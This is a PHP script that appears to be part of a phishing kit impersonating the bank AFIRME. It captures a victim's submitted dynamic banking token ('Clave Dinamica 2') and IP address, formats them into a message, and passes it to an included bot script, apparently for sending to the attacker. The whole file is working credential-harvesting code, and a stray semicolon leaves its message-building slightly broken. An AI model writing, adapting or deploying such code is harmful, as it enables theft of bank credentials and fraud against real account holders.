<?php  

	$dina=$_POST['dina'];
  


	$enviara ="➖➖➖➖[ AFIRME ]➖➖➖➖\n".
  "<b>✔️Clave Dinamica 2: </b>  <code>".$dina."</code>\n".

  
  

  "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
  "🌐WEBSITE:".$_SERVER['SERVER_NAME']."\n".
  $enviar =  urldecode($enviara);
  include 'bot_idd2.php';
?>
